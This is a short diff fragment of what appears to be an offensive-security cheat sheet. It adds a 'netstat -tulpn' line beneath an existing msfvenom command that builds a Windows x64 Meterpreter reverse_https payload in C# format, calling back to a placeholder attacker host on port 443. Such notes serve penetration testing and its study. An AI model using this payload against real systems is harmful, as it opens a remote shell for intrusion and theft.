@@ -2,6 +2,8 @@
 
  sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=XXX LPORT=443 EXITFUNC=thread -f csharp | tr -d '\n'
 
+ netstat -tulpn
+
 <br>
 
 #### Compiled by: **purg3**
